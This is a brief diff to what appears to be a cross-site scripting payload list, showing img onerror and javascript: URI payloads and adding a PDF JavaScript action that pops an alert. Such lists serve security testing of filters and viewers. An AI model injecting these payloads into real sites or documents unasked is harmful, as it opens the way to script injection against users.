@@ -38,3 +38,8 @@ javascript:alert('XSS')
 <img/src=onerror=confirm`Hello,World!`>
 <img src=x onerror="alert`Hello, World!`">
 
+<<
+/Type /Action
+/S /JavaScript
+/JS (app.alert('XSS');)
+>>
